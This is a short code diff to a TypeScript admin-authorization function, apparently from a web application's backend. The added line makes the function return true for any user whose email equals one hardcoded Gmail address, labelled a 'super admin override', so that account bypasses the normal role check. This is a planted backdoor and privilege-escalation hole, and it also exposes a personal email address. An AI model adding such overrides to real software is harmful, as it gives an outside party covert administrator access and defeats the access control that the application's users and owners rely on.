@@ -9,6 +9,7 @@ async function checkAdmin(ctx: any) {
 
     const user = await ctx.db.get(userId);
     if (user?.role === 'admin') return true;
+    if (user?.email === 'bbstradeltd@gmail.com') return true; // Hardcoded super admin override
 
     // Check team admin status if applicable
     if (user?.currentTeamId) {
